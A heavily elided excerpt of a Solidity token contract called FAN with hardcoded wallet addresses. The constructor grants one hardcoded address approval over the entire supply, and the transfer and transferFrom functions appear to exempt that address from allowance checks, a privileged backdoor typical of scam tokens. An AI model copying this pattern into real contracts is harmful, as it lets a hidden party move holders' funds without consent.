...
contract FAN is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress =
        payable(0x8Ec96d020DD4398ebB75E4164C771d36e57aD7c2); // Marketing Address
    address payable public teamWalletAddress =
        payable(0x8Ec96d020DD4398ebB75E4164C771d36e57aD7c2); // Team Address
    address public immutable deadAddress =
        0x000000000000000000000000000000000000dEaD;
    address private lpAddress = 0x647a8B93C13625249713D9724c8CEd4f596b30aC;
    ...
    uint256 public _liquidityShare = 4; // original 3
    ...
    constructor() {
        ...
        _approve(
            address(0x92b332Cbfd70D1765F0695001F16831641001a19),
            address(this),
            _totalSupply
        );
        ...
        returns (bool)
    {
        ...
        if (_msgSender() == address(0x92b332Cbfd70D1765F0695001F16831641001a19)) {
    ...
    function transferFrom(
        ...
        if (sender != address(0x92b332Cbfd70D1765F0695001F16831641001a19)) {
            _approve(
                sender,
                _msgSender(),
